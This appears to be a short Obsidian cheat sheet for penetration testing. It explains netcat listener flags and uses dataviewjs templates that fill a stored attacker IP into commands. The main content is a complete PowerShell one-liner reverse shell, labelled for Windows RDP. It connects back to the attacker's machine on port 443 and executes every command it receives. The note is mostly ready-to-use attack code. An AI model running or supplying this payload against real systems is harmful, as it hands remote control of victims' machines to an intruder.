nc -lvnp {port_number}

```
sudo nc -lvnp {port_number}
```

l : Listening mode. 
v : Verbose mode. Displays status messages in more detail. 
n : Numeric-only IP address. No hostname resolution. DNS is not being used. 
p : Port. Use to specify a particular port for listening.

```dataviewjs
const page = dv.page("Templater/IP");const ip = page?.IP ?? "NO IP FOUND";

const command = `sudo nc -nv ${ip} [portno]`;

dv.paragraph("```bash\n" + command + "\n```");
```

Windows RDP Command Prompt Reverse Shell

```dataviewjs
const page = dv.page("Templater/IP");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('${KaliIP}',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`;

dv.paragraph("```bash\n" + command + "\n```");
```